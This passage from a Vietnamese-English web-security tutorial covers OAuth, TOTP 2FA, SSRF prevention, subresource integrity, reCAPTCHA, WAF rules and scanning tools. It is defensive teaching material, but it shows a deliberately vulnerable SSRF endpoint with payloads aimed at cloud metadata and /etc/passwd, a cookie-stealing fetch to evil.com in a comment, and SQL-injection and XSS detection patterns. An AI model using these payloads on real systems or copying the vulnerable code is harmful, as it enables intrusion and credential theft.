    const params = new URLSearchParams(window.location.search);
    const token = params.get('token');

    if (token) {
      // ✅ Store access token in memory (Context/Zustand)
      authStore.setAccessToken(token);

      // ✅ Redirect to dashboard
      navigate('/dashboard');
    }
  }, []);

  return <div>Đang xử lý login...</div>;
}

// 📊 OAUTH FLOW DIAGRAM
/*
┌──────────┐                                     ┌─────────────┐
│  User    │                                     │   Google    │
└────┬─────┘                                     └──────┬──────┘
     │                                                  │
     │  1. Click "Login with Google"                   │
     ├──────────────────────────────────────────►      │
     │                                                  │
     │  2. Redirect to Google login                    │
     │  ◄──────────────────────────────────────────────┤
     │                                                  │
     │  3. User login + approve permissions            │
     ├──────────────────────────────────────────►      │
     │                                                  │
     │  4. Google redirects to callback + auth code    │
     │  ◄──────────────────────────────────────────────┤
     │                                                  │
┌────▼─────┐                                     ┌──────▼──────┐
│ Backend  │  5. Exchange code for tokens        │   Google    │
└────┬─────┘  ────────────────────────────────►  └──────┬──────┘
     │                                                   │
     │        6. Return user profile + tokens           │
     │   ◄───────────────────────────────────────────────┤
     │                                                   │
     │  7. Create/find user in DB                       │
     │  8. Generate JWT tokens                          │
     │  9. Set refresh token cookie                     │
     │  10. Redirect to frontend với access token       │
     │                                                   │
┌────▼─────┐                                            │
│ Frontend │  11. Store token + redirect to dashboard  │
└──────────┘                                            │
*/

// 🔐 D. Security Best Practices for OAuth

// ✅ 1. Validate state parameter (chống CSRF)
app.get('/auth/google', (req, res, next) => {
  const state = crypto.randomBytes(16).toString('hex');

  // Save state in session
  req.session.oauthState = state;

  passport.authenticate('google', {
    scope: ['profile', 'email'],
    state, // Pass state to Google
  })(req, res, next);
});

app.get('/auth/google/callback', (req, res, next) => {
  const state = req.query.state;

  // ✅ Verify state matches
  if (state !== req.session.oauthState) {
    return res.status(403).json({ error: 'Invalid state parameter' });
  }

  // Clear state
  delete req.session.oauthState;

  passport.authenticate('google')(req, res, next);
});

// ✅ 2. Use PKCE (Proof Key for Code Exchange) - for SPAs
// PKCE adds extra security layer for public clients (mobile apps, SPAs)

// ✅ 3. Limit scope (chỉ request permissions cần thiết)
// ❌ BAD: scope: ['profile', 'email', 'drive', 'calendar', 'contacts']
// ✅ GOOD: scope: ['profile', 'email']

// ✅ 4. Validate email verified
passport.use(
  new GoogleStrategy(
    {
      // ...
    },
    async (accessToken, refreshToken, profile, done) => {
      // ✅ Check if email is verified
      const email = profile.emails[0];
      if (!email.verified) {
        return done(new Error('Email not verified'), null);
      }

      // ...
    }
  )
);
```

---

### **🔒 8.3. TWO-FACTOR AUTHENTICATION (2FA) - Xác Thực 2 Bước**

**📌 Tại sao cần 2FA?**

- Password có thể bị đoán/leak
- 2FA thêm 1 layer bảo mật: **Something you know (password) + Something you have (phone/app)**

```typescript
// =====================================
// 2FA IMPLEMENTATION với TOTP (Time-based OTP)
// =====================================

import speakeasy from 'speakeasy';
import QRCode from 'qrcode';

// 🔐 A. Enable 2FA - Generate Secret
app.post('/api/2fa/enable', authenticateToken, async (req, res) => {
  const user = await db.users.findById(req.user.id);

  if (user.twoFactorEnabled) {
    return res.status(400).json({ error: '2FA đã được kích hoạt' });
  }

  // ✅ Generate secret key
  const secret = speakeasy.generateSecret({
    name: `YourApp (${user.email})`, // Hiển thị trong Authenticator app
    issuer: 'YourApp',
  });

  // ✅ Save secret (chưa enable, đợi user verify)
  await db.users.update(req.user.id, {
    twoFactorSecret: secret.base32, // Lưu secret (mã hóa trước!)
    twoFactorEnabled: false, // Chưa enable
  });

  // ✅ Generate QR code để user scan
  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);

  res.json({
    secret: secret.base32, // User có thể nhập manual
    qrCode: qrCodeUrl, // Hoặc scan QR code
  });
});

// 🔐 B. Verify 2FA Code và Enable
app.post('/api/2fa/verify', authenticateToken, async (req, res) => {
  const { code } = req.body;

  const user = await db.users.findById(req.user.id);

  // ✅ Verify TOTP code
  const verified = speakeasy.totp.verify({
    secret: user.twoFactorSecret,
    encoding: 'base32',
    token: code,
    window: 2, // Cho phép ±2 time windows (60 seconds)
  });

  if (!verified) {
    return res.status(400).json({ error: 'Mã xác thực không đúng' });
  }

  // ✅ Enable 2FA
  await db.users.update(req.user.id, {
    twoFactorEnabled: true,
  });

  // ✅ Generate backup codes (để recover khi mất phone)
  const backupCodes = Array.from({ length: 10 }, () =>
    crypto.randomBytes(4).toString('hex').toUpperCase()
  );

  // Save hashed backup codes
  await db.users.update(req.user.id, {
    backupCodes: backupCodes.map((code) => bcrypt.hashSync(code, 10)),
  });

  res.json({
    success: true,
    message: '2FA đã được kích hoạt',
    backupCodes, // Show once, user phải lưu lại
  });
});

// 🔐 C. Login with 2FA
app.post('/api/login', async (req, res) => {
  const { email, password, twoFactorCode } = req.body;

  // ✅ Step 1: Verify password
  const user = await db.users.findOne({ email });
  if (!user) {
    return res.status(401).json({ error: 'Email không tồn tại' });
  }

  const validPassword = await bcrypt.compare(password, user.passwordHash);
  if (!validPassword) {
    return res.status(401).json({ error: 'Mật khẩu không đúng' });
  }

  // ✅ Step 2: Check if 2FA enabled
  if (user.twoFactorEnabled) {
    if (!twoFactorCode) {
      // Yêu cầu user nhập 2FA code
      return res.status(403).json({
        error: '2FA_REQUIRED',
        message: 'Vui lòng nhập mã xác thực 2FA',
      });
    }

    // ✅ Verify 2FA code
    const verified = speakeasy.totp.verify({
      secret: user.twoFactorSecret,
      encoding: 'base32',
      token: twoFactorCode,
      window: 2,
    });

    if (!verified) {
      // ❌ 2FA code sai
      return res.status(401).json({ error: 'Mã xác thực không đúng' });
    }
  }

  // ✅ Step 3: Generate JWT tokens
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_TOKEN_SECRET!,
    { expiresIn: '7d' }
  );

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  res.json({ accessToken });
});

// 🔐 D. Backup Code Login (khi mất phone)
app.post('/api/login/backup-code', async (req, res) => {
  const { email, password, backupCode } = req.body;

  const user = await db.users.findOne({ email });

  // Verify password...

  // ✅ Check backup code
  const validBackupCode = user.backupCodes.some((hashedCode) =>
    bcrypt.compareSync(backupCode, hashedCode)
  );

  if (!validBackupCode) {
    return res.status(401).json({ error: 'Backup code không hợp lệ' });
  }

  // ✅ Remove used backup code
  await db.users.update(user.id, {
    backupCodes: user.backupCodes.filter(
      (hashedCode) => !bcrypt.compareSync(backupCode, hashedCode)
    ),
  });

  // Generate tokens...
  res.json({ accessToken, message: 'Login thành công với backup code' });
});

// 🔐 E. Frontend Implementation
function TwoFactorSetup() {
  const [qrCode, setQrCode] = useState('');
  const [secret, setSecret] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [backupCodes, setBackupCodes] = useState<string[]>([]);
  const [step, setStep] = useState<'enable' | 'verify' | 'complete'>('enable');

  const handleEnable2FA = async () => {
    const res = await fetch('/api/2fa/enable', {
      method: 'POST',
      headers: { Authorization: `Bearer ${accessToken}` },
    });

    const data = await res.json();
    setQrCode(data.qrCode);
    setSecret(data.secret);
    setStep('verify');
  };

  const handleVerify = async () => {
    const res = await fetch('/api/2fa/verify', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ code: verificationCode }),
    });

    const data = await res.json();
    if (data.success) {
      setBackupCodes(data.backupCodes);
      setStep('complete');
    }
  };

  return (
    <div>
      {step === 'enable' && (
        <button onClick={handleEnable2FA}>Kích hoạt 2FA</button>
      )}

      {step === 'verify' && (
        <div>
          <h3>Scan QR Code với Google Authenticator</h3>
          <img src={qrCode} alt="QR Code" />
          <p>Hoặc nhập manual: {secret}</p>

          <input
            type="text"
            placeholder="Nhập mã 6 số"
            value={verificationCode}
            onChange={(e) => setVerificationCode(e.target.value)}
          />
          <button onClick={handleVerify}>Xác nhận</button>
        </div>
      )}

      {step === 'complete' && (
        <div>
          <h3>✅ 2FA đã được kích hoạt!</h3>
          <h4>Backup Codes (lưu lại an toàn):</h4>
          <ul>
            {backupCodes.map((code) => (
              <li key={code}>{code}</li>
            ))}
          </ul>
          <p>⚠️ Mỗi backup code chỉ dùng được 1 lần</p>
        </div>
      )}
    </div>
  );
}

// Login với 2FA
function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [twoFactorCode, setTwoFactorCode] = useState('');
  const [require2FA, setRequire2FA] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    const res = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, twoFactorCode }),
    });

    const data = await res.json();

    if (data.error === '2FA_REQUIRED') {
      setRequire2FA(true);
      return;
    }

    if (data.accessToken) {
      // Login thành công
      authStore.setAccessToken(data.accessToken);
      navigate('/dashboard');
    }
  };

  return (
    <form onSubmit={handleLogin}>
      <input
        type="email"
        placeholder="Email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />

      {require2FA && (
        <input
          type="text"
          placeholder="Mã xác thực 6 số"
          value={twoFactorCode}
          onChange={(e) => setTwoFactorCode(e.target.value)}
          maxLength={6}
        />
      )}

      <button type="submit">Login</button>
    </form>
  );
}

// 📊 2FA BEST PRACTICES
/*
✅ Use TOTP (Time-based OTP) với Google Authenticator / Authy
✅ Provide backup codes (10 codes, single-use)
✅ Allow disabling 2FA (với password + backup code)
✅ Log 2FA events (enable, disable, failed attempts)
✅ Rate limit 2FA verification (5 attempts/15 minutes)
✅ Consider SMS 2FA as fallback (nhưng less secure)
✅ Support multiple 2FA devices
✅ Send email alert khi 2FA enabled/disabled
*/
```

---

### **🚫 8.4. SERVER-SIDE REQUEST FORGERY (SSRF) - Tấn Công SSRF**

**📌 Giải thích:** SSRF là khi hacker trick server gửi request đến internal resources

**Ví dụ tấn công:**

```typescript
// ❌ VULNERABLE CODE
app.get('/api/fetch-image', async (req, res) => {
  const { url } = req.query;

  // Hacker có thể:
  // /api/fetch-image?url=http://localhost:6379 (Redis)
  // /api/fetch-image?url=http://169.254.169.254/latest/meta-data (AWS metadata)
  // /api/fetch-image?url=file:///etc/passwd (Local files)

  const response = await fetch(url); // ❌ SSRF vulnerability!
  const data = await response.text();
  res.send(data);
});
```

**✅ Giải pháp:**

```typescript
// =====================================
// SSRF PREVENTION
// =====================================

import { URL } from 'url';
import dns from 'dns/promises';

// 🛡️ A. Whitelist Allowed Domains
const ALLOWED_DOMAINS = [
  'api.example.com',
  'cdn.example.com',
  's3.amazonaws.com',
];

async function isAllowedURL(urlString: string): Promise<boolean> {
  try {
    const url = new URL(urlString);

    // ✅ Check 1: Only HTTPS
    if (url.protocol !== 'https:') {
      return false;
    }

    // ✅ Check 2: Whitelist domain
    const hostname = url.hostname;
    if (!ALLOWED_DOMAINS.includes(hostname)) {
      return false;
    }

    // ✅ Check 3: Resolve DNS → check không phải internal IP
    const addresses = await dns.resolve4(hostname);

    for (const ip of addresses) {
      if (isPrivateIP(ip)) {
        console.log(
          `❌ SSRF attempt: ${hostname} resolves to private IP ${ip}`
        );
        return false;
      }
    }

    return true;
  } catch (error) {
    return false;
  }
}

// 🛡️ B. Check Private IP Ranges
function isPrivateIP(ip: string): boolean {
  const parts = ip.split('.').map(Number);

  // 10.0.0.0/8
  if (parts[0] === 10) return true;

  // 172.16.0.0/12
  if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;

  // 192.168.0.0/16
  if (parts[0] === 192 && parts[1] === 168) return true;

  // 127.0.0.0/8 (localhost)
  if (parts[0] === 127) return true;

  // 169.254.0.0/16 (link-local)
  if (parts[0] === 169 && parts[1] === 254) return true;

  // 0.0.0.0/8
  if (parts[0] === 0) return true;

  return false;
}

// 🛡️ C. Secure Fetch Implementation
app.get('/api/fetch-image', authenticateToken, async (req, res) => {
  const { url } = req.query;

  if (!url || typeof url !== 'string') {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  // ✅ Validate URL
  const isAllowed = await isAllowedURL(url);
  if (!isAllowed) {
    console.log(`⚠️ SSRF attempt blocked: ${url}`);
    return res.status(403).json({ error: 'URL not allowed' });
  }

  try {
    // ✅ Fetch với timeout
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000); // 5s timeout

    const response = await fetch(url, {
      signal: controller.signal,
      // ✅ Limit redirects
      redirect: 'manual',
    });

    clearTimeout(timeout);

    // ✅ Check response size
    const contentLength = response.headers.get('content-length');
    if (contentLength && parseInt(contentLength) > 5 * 1024 * 1024) {
      return res.status(413).json({ error: 'File too large' });
    }

    // ✅ Validate content type
    const contentType = response.headers.get('content-type');
    if (!contentType?.startsWith('image/')) {
      return res.status(400).json({ error: 'Not an image' });
    }

    const buffer = await response.arrayBuffer();
    res.contentType(contentType);
    res.send(Buffer.from(buffer));
  } catch (error) {
    if (error.name === 'AbortError') {
      return res.status(408).json({ error: 'Request timeout' });
    }
    res.status(500).json({ error: 'Fetch failed' });
  }
});

// 📊 SSRF PREVENTION CHECKLIST
/*
✅ Whitelist allowed domains/IPs
✅ Block private IP ranges (10.x.x.x, 192.168.x.x, 127.0.0.1)
✅ Block AWS metadata endpoint (169.254.169.254)
✅ Resolve DNS before fetching (check IP)
✅ Only allow HTTP/HTTPS protocols
✅ Disable redirects or limit to 3 max
✅ Set request timeout (5-10 seconds)
✅ Validate response content-type
✅ Limit response size
✅ Log suspicious requests
*/
```

---

### **🔐 8.5. SUBRESOURCE INTEGRITY (SRI) - Xác Minh Tài Nguyên**

**📌 Vấn Đề:** CDN bị hack → file JavaScript bị sửa → inject malicious code

**✅ Giải pháp:** SRI = Verify file hash trước khi execute

```html
<!-- =====================================
     SUBRESOURCE INTEGRITY (SRI)
     ===================================== -->

<!-- ❌ KHÔNG AN TOÀN: Không có integrity check -->
<script src="https://cdn.example.com/library.js"></script>

<!-- Nếu CDN bị hack:
     library.js → inject: fetch('https://evil.com?cookie='+document.cookie)
     → Tất cả websites dùng CDN này bị hack!
-->

<!-- ✅ AN TOÀN: Có SRI integrity check -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux"
  crossorigin="anonymous"
></script>

<!--
  integrity="sha384-..."
  - Browser tính hash của file
  - So sánh với hash trong integrity attribute
  - Nếu khác nhau → BLOCK file → script không chạy
  - Nếu CDN bị hack và file thay đổi → hash khác → blocked!
-->

<!-- ✅ Ví dụ với React từ CDN -->
<script
  src="https://unpkg.com/react@18/umd/react.production.min.js"
  integrity="sha384-cPJnyRZOYk8WjQbB6nBp9Iw0VgK6k7KkW6w3YwZ3C8nBp9Iw0VgK6k7KkW6w3YwZ"
  crossorigin="anonymous"
></script>

<!-- ✅ Multiple hashes (fallback algorithms) -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha256-abc123... sha384-def456... sha512-ghi789..."
  crossorigin="anonymous"
></script>
```

**🛠️ Generate SRI Hash:**

```bash
# Command line
cat library.js | openssl dgst -sha384 -binary | openssl base64 -A

# Output: oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux...
```

```typescript
// Node.js
import crypto from 'crypto';
import fs from 'fs';

function generateSRIHash(
  filePath: string,
  algorithm: 'sha256' | 'sha384' | 'sha512' = 'sha384'
): string {
  const fileBuffer = fs.readFileSync(filePath);
  const hash = crypto.createHash(algorithm).update(fileBuffer).digest('base64');
  return `${algorithm}-${hash}`;
}

// Usage
const sriHash = generateSRIHash('./library.js', 'sha384');
console.log(`integrity="${sriHash}"`);
// Output: integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
```

**📊 SRI Best Practices:**

```typescript
/*
✅ Always use SRI for third-party CDN files
✅ Use sha384 or sha512 (sha256 acceptable but weaker)
✅ Include crossorigin="anonymous" attribute
✅ Consider using multiple hashes for algorithm agility
✅ Update hashes when updating library versions
✅ Use tools: https://www.srihash.org/
❌ Don't use SRI for self-hosted files (unnecessary)
❌ Don't use SRI with dynamic content
*/
```

---

### **🤖 8.6. CAPTCHA IMPLEMENTATION - Chống Bot**

**📌 Use cases:**

- Login form (chống brute-force)
- Registration form (chống spam accounts)
- Contact form (chống spam messages)
- Password reset (chống account enumeration)

```typescript
// =====================================
// GOOGLE reCAPTCHA v3 IMPLEMENTATION
// =====================================

// 🤖 A. Frontend Implementation (React)
import { useEffect, useState } from 'react';

// Load reCAPTCHA script
function loadReCaptchaScript() {
  const script = document.createElement('script');
  script.src = `https://www.google.com/recaptcha/api.js?render=${RECAPTCHA_SITE_KEY}`;
  document.head.appendChild(script);
}

function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  useEffect(() => {
    loadReCaptchaScript();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // ✅ Execute reCAPTCHA
      const token = await window.grecaptcha.execute(RECAPTCHA_SITE_KEY, {
        action: 'login' // Action name (để phân tích)
      });

      // ✅ Send token to backend
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          recaptchaToken: token // ✅ Include reCAPTCHA token
        })
      });

      const data = await res.json();

      if (data.accessToken) {
        authStore.setAccessToken(data.accessToken);
        navigate('/dashboard');
      }

    } catch (error) {
      console.error('Login error:', error);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        placeholder="Email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <button type="submit">Login</button>

      {/* reCAPTCHA badge (auto-displayed) */}
    </form>
  );
}

// 🤖 B. Backend Verification
import axios from 'axios';

interface RecaptchaResponse {
  success: boolean;
  score: number; // 0.0 - 1.0 (1.0 = definitely human, 0.0 = definitely bot)
  action: string;
  challenge_ts: string;
  hostname: string;
  'error-codes'?: string[];
}

async function verifyRecaptcha(token: string, expectedAction: string): Promise<boolean> {
  try {
    // ✅ Call Google reCAPTCHA API
    const response = await axios.post<RecaptchaResponse>(
      'https://www.google.com/recaptcha/api/siteverify',
      null,
      {
        params: {
          secret: process.env.RECAPTCHA_SECRET_KEY,
          response: token
        }
      }
    );

    const data = response.data;

    // ✅ Check success
    if (!data.success) {
      console.log('❌ reCAPTCHA verification failed:', data['error-codes']);
      return false;
    }

    // ✅ Check action matches
    if (data.action !== expectedAction) {
      console.log(`❌ Action mismatch: expected ${expectedAction}, got ${data.action}`);
      return false;
    }

    // ✅ Check score (0.0 - 1.0)
    // - 1.0: Definitely human
    // - 0.5: Suspicious
    // - 0.0: Definitely bot
    const threshold = 0.5; // Adjust based on your needs

    if (data.score < threshold) {
      console.log(`⚠️ Low reCAPTCHA score: ${data.score} (threshold: ${threshold})`);
      return false;
    }

    console.log(`✅ reCAPTCHA passed: score ${data.score}`);
    return true;

  } catch (error) {
    console.error('reCAPTCHA verification error:', error);
    return false; // Fail securely
  }
}

// 🤖 C. Login with CAPTCHA Verification
app.post('/api/login', async (req, res) => {
  const { email, password, recaptchaToken } = req.body;

  // ✅ Verify reCAPTCHA
  const isHuman = await verifyRecaptcha(recaptchaToken, 'login');

  if (!isHuman) {
    return res.status(403).json({
      error: 'reCAPTCHA verification failed. Are you a bot?'
    });
  }

  // ✅ Continue with login logic
  const user = await db.users.findOne({ email });
  // ... rest of login logic
});

// 📊 reCAPTCHA v3 vs v2

/*
┌──────────────────┬────────────────────────────────────────────────────┐
│  reCAPTCHA v2    │  reCAPTCHA v3                                     │
├──────────────────┼────────────────────────────────────────────────────┤
│  ✅ Checkbox      │  ✅ No user interaction                            │
│  ✅ Challenge     │  ✅ Score-based (0.0 - 1.0)                        │
│  ❌ UX impact     │  ✅ Better UX (invisible)                          │
│  ✅ Clear result  │  ⚠️ Requires threshold tuning                     │
│  Use: Forms      │  Use: All interactions (login, submit, checkout)  │
└──────────────────┴────────────────────────────────────────────────────┘
*/

// 🤖 D. Alternative: hCaptcha (GDPR-compliant)
// hCaptcha tương tự reCAPTCHA nhưng privacy-focused

// Frontend
<script src="https://hcaptcha.com/1/api.js" async defer></script>
<div class="h-captcha" data-sitekey="your-site-key"></div>

// Backend
const response = await axios.post('https://hcaptcha.com/siteverify', {
  secret: process.env.HCAPTCHA_SECRET,
  response: req.body.hcaptchaToken
});
```

---

### **🛡️ 8.7. WEB APPLICATION FIREWALL (WAF) - Tường Lửa Web**

**📌 Định nghĩa:** WAF = firewall bảo vệ web app khỏi các attacks (XSS, SQL injection, DDoS)

**🔧 Implementation với Cloudflare WAF:**

```typescript
// =====================================
// CLOUDFLARE WAF SETUP
// =====================================

/*
📊 Cloudflare WAF Features:

1️⃣ Managed Rulesets
   - OWASP Core Rule Set
   - Cloudflare Managed Ruleset
   - Auto-block XSS, SQL injection, RCE

2️⃣ Rate Limiting
   - Limit requests per IP
   - Custom rules per endpoint

3️⃣ DDoS Protection
   - Layer 3/4 DDoS mitigation
   - Layer 7 (application) DDoS protection

4️⃣ Bot Management
   - Block malicious bots
   - Allow good bots (Google, Bing)

5️⃣ Custom Rules
   - Block by country
   - Block by IP
   - Custom firewall rules
*/

// ✅ A. Cloudflare Custom Rule Examples
// (Configure trong Cloudflare Dashboard → Security → WAF)

// Rule 1: Block SQL injection attempts
// (http.request.uri.query contains "' OR '1'='1" or http.request.body contains "UNION SELECT")

// Rule 2: Rate limit login endpoint
// (http.request.uri.path eq "/api/login" and rate(1m) > 5)

// Rule 3: Block by country
// (ip.geoip.country in {"CN" "RU" "KP"})

// Rule 4: Allow only specific User-Agents
// (not http.user_agent contains "Mozilla" and not http.user_agent contains "Chrome")

// ✅ B. AWS WAF Implementation
import {
  WAFv2Client,
  CreateWebACLCommand,
  CreateRuleGroupCommand,
} from '@aws-sdk/client-wafv2';

const wafClient = new WAFv2Client({ region: 'us-east-1' });

// Create WAF Web ACL
const createWAF = async () => {
  const command = new CreateWebACLCommand({
    Name: 'MyWebACL',
    Scope: 'REGIONAL', // or 'CLOUDFRONT'
    DefaultAction: { Allow: {} }, // Default allow

    Rules: [
      {
        Name: 'RateLimitRule',
        Priority: 1,
        Statement: {
          RateBasedStatement: {
            Limit: 2000, // 2000 requests per 5 minutes
            AggregateKeyType: 'IP',
          },
        },
        Action: { Block: {} },
        VisibilityConfig: {
          SampledRequestsEnabled: true,
          CloudWatchMetricsEnabled: true,
          MetricName: 'RateLimitRule',
        },
      },
      {
        Name: 'SQLInjectionRule',
        Priority: 2,
        Statement: {
          SqliMatchStatement: {
            FieldToMatch: {
              QueryString: {},
            },
            TextTransformations: [
              { Priority: 0, Type: 'URL_DECODE' },
              { Priority: 1, Type: 'HTML_ENTITY_DECODE' },
            ],
          },
        },
        Action: { Block: {} },
        VisibilityConfig: {
          SampledRequestsEnabled: true,
          CloudWatchMetricsEnabled: true,
          MetricName: 'SQLInjectionRule',
        },
      },
      {
        Name: 'XSSRule',
        Priority: 3,
        Statement: {
          XssMatchStatement: {
            FieldToMatch: {
              AllQueryArguments: {},
            },
            TextTransformations: [
              { Priority: 0, Type: 'URL_DECODE' },
              { Priority: 1, Type: 'HTML_ENTITY_DECODE' },
            ],
          },
        },
        Action: { Block: {} },
        VisibilityConfig: {
          SampledRequestsEnabled: true,
          CloudWatchMetricsEnabled: true,
          MetricName: 'XSSRule',
        },
      },
    ],

    VisibilityConfig: {
      SampledRequestsEnabled: true,
      CloudWatchMetricsEnabled: true,
      MetricName: 'MyWebACL',
    },
  });

  const response = await wafClient.send(command);
  console.log('✅ WAF Created:', response.Summary);
};

// ✅ C. Application-Level WAF (Express Middleware)
import { expressjwt } from 'express-jwt';

// WAF Middleware
const wafMiddleware = (req: Request, res: Response, next: NextFunction) => {
  const ip = req.ip;
  const url = req.url;
  const body = JSON.stringify(req.body);

  // ✅ Check 1: SQL Injection patterns
  const sqlPattern =
    /(\bOR\b|\bAND\b).*=.*|UNION|SELECT|DROP|DELETE|INSERT|UPDATE/i;
  if (sqlPattern.test(url) || sqlPattern.test(body)) {
    console.log(`⚠️ SQL Injection attempt from ${ip}: ${url}`);
    return res.status(403).json({ error: 'Forbidden' });
  }

  // ✅ Check 2: XSS patterns
  const xssPattern = /<script|javascript:|onerror=|onclick=/i;
  if (xssPattern.test(url) || xssPattern.test(body)) {
    console.log(`⚠️ XSS attempt from ${ip}`);
    return res.status(403).json({ error: 'Forbidden' });
  }

  // ✅ Check 3: Path traversal
  if (url.includes('../') || url.includes('..\\')) {
    console.log(`⚠️ Path traversal attempt from ${ip}: ${url}`);
    return res.status(403).json({ error: 'Forbidden' });
  }

  // ✅ Check 4: Blocked IPs
  const BLOCKED_IPS = ['1.2.3.4', '5.6.7.8'];
  if (BLOCKED_IPS.includes(ip)) {
    console.log(`⚠️ Blocked IP attempted access: ${ip}`);
    return res.status(403).json({ error: 'Your IP is blocked' });
  }

  next();
};

// Apply WAF middleware globally
app.use(wafMiddleware);

// 📊 WAF BEST PRACTICES
/*
✅ Use managed rule sets (OWASP Core Rule Set)
✅ Enable rate limiting per endpoint
✅ Log all blocked requests
✅ Whitelist known good IPs (office, CI/CD)
✅ Tune rules to reduce false positives
✅ Monitor WAF metrics (blocked requests, false positives)
✅ Combine with DDoS protection
✅ Use CDN + WAF (Cloudflare, AWS CloudFront)
❌ Don't rely solely on WAF (defense in depth)
❌ Don't block legitimate traffic (test thoroughly)
*/
```

---

### **🔍 8.8. SECURITY TESTING TOOLS - Công Cụ Test Bảo Mật**

```typescript
// =====================================
// SECURITY TESTING & SCANNING
// =====================================

/*
🛠️ Security Testing Tools:

1️⃣ OWASP ZAP (Zed Attack Proxy)
   - Free, open-source
   - Automated security scanning
   - Find XSS, SQL injection, CSRF
   - https://www.zaproxy.org/

2️⃣ Burp Suite
   - Industry standard
   - Manual + automated testing
   - Powerful scanner
   - https://portswigger.net/burp

3️⃣ Nmap
   - Network scanner
   - Port scanning
   - Service detection

4️⃣ Nikto
   - Web server scanner
   - Find misconfigurations
   - Check for outdated software

5️⃣ SQLMap
   - Automated SQL injection tool
   - Test database security

6️⃣ OWASP Dependency-Check
   - Scan dependencies for vulnerabilities
   - NPM audit, Snyk alternative

7️⃣ SSL Labs
   - Test TLS/SSL configuration
   - https://www.ssllabs.com/ssltest/

8️⃣ SecurityHeaders.com
   - Scan security headers
   - https://securityheaders.com/
*/

// 🔧 A. Automated Security Testing với npm audit
// package.json scripts
{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "audit:force": "npm audit fix --force"
  }
}

// CI/CD pipeline (GitHub Actions)
// .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run npm audit
        run: npm audit --audit-level=high

      - name: Run OWASP Dependency-Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'my-project'
          path: '.'
          format: 'HTML'

      - name: Upload Results
        uses: actions/upload-artifact@v3
        with:
          name: dependency-check-report
          path: dependency-check-report.html

// 🔧 B. Snyk Integration (Vulnerability Scanning)
import snyk from 'snyk';

async function scanDependencies() {
  const results = await snyk.test('./package.json', {
    org: 'my-org',
    'package-manager': 'npm'
  });

  console.log('Vulnerabilities found:', results.vulnerabilities.length);

  results.vulnerabilities.forEach(vuln => {
    console.log(`- ${vuln.title} (${vuln.severity})`);
    console.log(`  Package: ${vuln.packageName}@${vuln.version}`);
    console.log(`  Fix: ${vuln.upgradePath.join(' → ')}`);
  });
}

// 🔧 C. OWASP ZAP Automated Scan
// zap-scan.js
const ZapClient = require('zaproxy');

async function runZAPScan(targetUrl) {
  const zaproxy = new ZapClient({
    apiKey: process.env.ZAP_API_KEY,
    proxy: 'http://localhost:8080'
  });

  console.log('🔍 Starting ZAP scan...');

  // Spider (crawl website)
  await zaproxy.spider.scan(targetUrl);

  // Active scan (attack)
  const scanId = await zaproxy.ascan.scan(targetUrl);

  // Wait for scan to complete
  let status = 0;
  while (status < 100) {
    await new Promise(resolve => setTimeout(resolve, 5000));
    status = await zaproxy.ascan.status(scanId);
    console.log(`Scan progress: ${status}%`);
  }

  // Get results
  const alerts = await zaproxy.core.alerts(targetUrl);

  console.log(`✅ Scan complete. Found ${alerts.length} issues:`);

  alerts.forEach(alert => {
    console.log(`- [${alert.risk}] ${alert.alert}`);
    console.log(`  URL: ${alert.url}`);
    console.log(`  Description: ${alert.description}`);
    console.log(`  Solution: ${alert.solution}`);
  });
}

// 🔧 D. Security Headers Check Script
async function checkSecurityHeaders(url: string) {
  const response = await fetch(url);
  const headers = response.headers;

  const securityHeaders = {
    'strict-transport-security': headers.get('strict-transport-security'),
    'content-security-policy': headers.get('content-security-policy'),
    'x-frame-options': headers.get('x-frame-options'),
    'x-content-type-options': headers.get('x-content-type-options'),
    'referrer-policy': headers.get('referrer-policy'),
    'permissions-policy': headers.get('permissions-policy')
  };

  console.log('🔐 Security Headers:');
  Object.entries(securityHeaders).forEach(([header, value]) => {
    if (value) {
      console.log(`✅ ${header}: ${value}`);
    } else {
      console.log(`❌ ${header}: MISSING`);
    }
  });
}

// Usage
checkSecurityHeaders('https://yourwebsite.com');

// 📊 SECURITY TESTING CHECKLIST
/*
✅ Run npm audit regularly (CI/CD)
✅ Use Snyk/Dependabot for dependency vulnerabilities
✅ Scan with OWASP ZAP before production deploy
✅ Test TLS/SSL configuration (SSL Labs)
✅ Verify security headers (securityheaders.com)
✅ Penetration testing (hire security experts)
